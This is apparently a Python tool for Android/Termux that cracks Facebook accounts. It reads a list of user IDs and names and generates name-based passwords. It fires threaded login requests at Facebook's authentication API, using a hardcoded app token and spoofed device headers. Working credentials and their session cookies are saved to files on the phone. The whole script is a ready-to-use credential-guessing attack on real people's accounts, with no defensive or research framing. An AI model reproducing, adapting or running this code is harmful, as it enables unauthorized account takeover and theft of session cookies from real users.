from os import path
import random,uuid,string,hashlib,json
import uuid,base64,requests,zlib,httpx,time
import os,zlib,pip,urllib,urllib3
import platform
import smtplib
import math
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n INSTALLING MISSING MODULES ...')
        os.system('pip install requests futures==2 > /dev/null')
except:pass

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
try:os.mkdir('/sdcard/=[SAMI-BRO]=')
except:pass
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];plist = [];user = []
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
def clear():
	os.system('clear');print(logo)
def mn():
	print(f"{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤ ")
def fire():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 2;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
        return ua
os.system("clear")
sim = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', ' ➤ \x1b[1;92m')
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';SX = "{A}({R}+{A}) {A}"
logo = (f"""
      {G1}▞▀▖ ▞▀▖ ▙▗▌ ▜▘   ▞▀▖ ▌ ▌ ▙▗▌ ▛▀▀ ▛▀▖
      {G2}▚▄  ▙▄▌ ▌▘▌ ▐    ▙▄▌ ▙▄▌ ▌▘▌ ▙▄  ▌ ▌
      {G3}▖ ▌ ▌ ▌ ▌ ▌ ▐    ▌ ▌ ▌ ▌ ▌ ▌ ▌   ▌ ▌
      {G4}▝▀  ▘ ▘ ▘ ▘ ▀▘   ▘ ▘ ▘ ▘ ▘ ▘ ▀▀▀ ▀▀ {R}/{A}V-0.1
{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤   
{A}({R}+{A}) {A}DEVLOPER {R}: {A}SAMI AHAMED
{A}({R}+{A}) {A}FACEBOOK {R}: {A}SAMI AHAMED
{A}({R}+{A}) {A}GITHUB   {R}: {A}AKASH-123
{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤   
 {Y}➤ {A}USER TOKEN  {R}:{G}
{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
print(logo)
def menu():
        try:
                        clear()
                        print(f'{A}({R}1{A}) {A}FILE CLONING ');print(f'{A}({R}0{A}) {A}EXIT TOOL');mn()
                        xd=input(f'{A}({R}+{A}) {A}CHOICE   {R}:{A} ')
                        if xd in ['1','01']:
                                clear();print(f'{A}({R}+{A}) {A}EXAMPLE  {R}: {A}/sdcard/filename.txt ');mn()
                                file = input(f'{A}({R}+{A}) {A}INPUT    {R}:{A} ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'{A}({R}+{A}) {A}FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'({A}1) METHOD ({A}M1)-(FIRE)');mn();mthd=input(f'{A}({R}+{A}) {A}CHOICE : ')
                                try:
                                    clear()
                                    ps_limit = int(input(f'{A}({R}1{A}) {A}PASSWORD LIMIT : '))
                                except:
                                    ps_limit =1
                                clear()
                                print(f'{A}({R}+{A}) {A}{R}({A}EXAMPLE{R}) {A}first last {R}~ {A}first123 {R}~ {A}57273200');mn()
                                for i in range(ps_limit):
                                    plist.append(input(f'{A}({R}+{A}) {A}PASSWORD NO {i+1} {R}: {A} '));mn()
                                print(f'{A}({R}+{A}) {A}{R}({A}EXAMPLE{R}) {A}first last {R}~ {A}first123 {R}~ {A}57273200');mn();clear();print(f'{A}({R}+{A}) {A}DO YOU WENT SHOW CP ACCOUNT : {R}({A}Y{R}/{A}N{R})');mn();cx=input(f'{A}({R}+{A}) CHOICE{R} :{A} ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'{A}({R}+{A}) {A}TOTAL ACCOUNT {R}:{A} '+total_ids+f' ');print(f"{A}({R}+{A}) Sim : {sim}");print(f'{A}({R}+{A})\x1b[38;5;46m {A}TOTAL-PASS {R}:{A} {ps_limit}');print(f'{A}({R}+{A}) IF NO RESULT {R}[{A}ON{R}/{A}OFF{R}] {A}AIRPLANE MODE');print(f'{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤')                             
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                print('\033[1;37m')
                                print(f'{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤ ')
                                print(f'{A}({R}+{A}) {A} THE PROCESS HAS COMPLETED')
                                print(f'{A}({R}+{A}) {A} TOTAL OK/CP : '+str(len(oks))+'\n'f'{A}({R}+{A}) {A} TOTAL CP : '+str(len(cps)))
                                print(f'{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤ ')
                                input(f'{A}({R}+{A}) {A} PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                rnd()
                        elif xd in ['3','03']:
                                _old_()
                        elif xd in ['0','05']:
                                exit(f'{A}({R}+{A}) {A} CLOSE ')
                        else:
                                exit(f'{A}({R}+{A}) {A} OPTION NOT FOUND IN')
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'{A}({R}+{A}) {A}NO INTERNET CONNECTION...')
                exit()
def api1(ids,names,passlist):
        try:
                global oks,loop,sim_id,device
                sys.stdout.write(f'\r\r{R}({A}SAMIR-123{R}) {R}- {R}({A}METHOD-N{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                "sim_country": "id",
                                'try_num':'1',
                                'family_device_id':family,
                                'sim_serials':sim_serials,
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'logged_out_id': str(uuid.uuid4()),
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'tier': 'regular',
                                'reg_instance': str(uuid.uuid4()),
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'locale':fblc,
                                'client_country_code':'',
                                'fb_api_req_friendly_name':'authenticate',
                                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
                                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                                'User-Agent': fire(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r {G}SUCCESS {A}➤ {G}{ids} {A}•{G} {pas}')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print(f"\r\r{R}({A}COOKIE{R}){A} "+coki)
                                        open('/sdcard/SAMI-OK.txt', 'a').write(ids+' | '+pas+' | '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R}({A}DEATH{R}) '+ids+' | '+pas+'{R}')
                                                open('/sdcard/SAMIR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
menu()